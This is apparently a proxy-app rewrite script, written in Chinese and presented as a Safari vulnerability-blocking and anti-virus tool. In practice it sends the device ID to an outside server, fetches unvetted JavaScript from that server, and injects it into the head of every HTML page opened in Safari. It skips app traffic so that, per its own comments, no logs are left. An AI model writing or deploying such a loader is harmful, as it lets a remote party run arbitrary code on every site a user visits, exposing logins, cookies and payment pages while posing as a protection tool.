/**
 * Safari漏洞封堵&病毒防范脚本 (云端验证 Version)
 * 作者：fiywind
 * Safari 漏洞封堵 Loader (原生判定版)
 * 作用：仅在原生 Safari 中注入 lockDown 物理封堵逻辑
 * 更新：2026-04-08
 */

/**
 * Safari 漏洞封堵 Loader (终极熔断版)
 * 解决：微信视频流堆积、App 误伤、Unauthorized 报错
 */

const ua = $request.headers['User-Agent'] || $request.headers['user-agent'] || "";
const contentType = $response.headers['Content-Type'] || $response.headers['content-type'] || "";
const url = $request.url || "";

// 1. 【核心熔断】识别 App 标识符
const isApp = /MicroMessenger|WeChat|QQ\/|Weibo|XHS-App|NewsArticle|Toutiao|Alipay|MailMaster/i.test(ua);

// 2. 【核心熔断】识别非网页域名及非 HTML 资源
const isNonHtml = /video\.qq\.com|weixin\.qq\.com|qlogo\.cn|apple\.com|google\.com/i.test(url) || 
                  (contentType && !contentType.includes("text/html"));

// 3. 执行熔断：如果是 App 流量或非网页资源，瞬间退出，不留任何日志
if (isApp || isNonHtml || !$response.body) {
    $done({});
} else {
    // 4. 仅在真正的原生 Safari 网页中运行
    if (ua.includes("Safari") && ua.includes("Version/")) {
        const did = $environment.device_id;
        const authUrl = `https://bhip.cc.cd/?id=${did}`;

        $httpClient.get(authUrl, (err, resp, data) => {
            // 只有当云端鉴权成功 (200) 且返回内容正确时才注入
            if (!err && resp.status === 200 && data.includes("WebAssembly")) {
                const payload = `<script id="sh-ld-core">${data}</script>`;
                let body = $response.body.replace(/<head[^>]*>/i, `$&${payload}`);
                console.log("🛡️ lockDown Active: " + url);
                $done({ body });
            } else {
                // 鉴权失败 (如 Unauthorized) 则直接放行原文
                $done({});
            }
        });
    } else {
        $done({});
    }
}
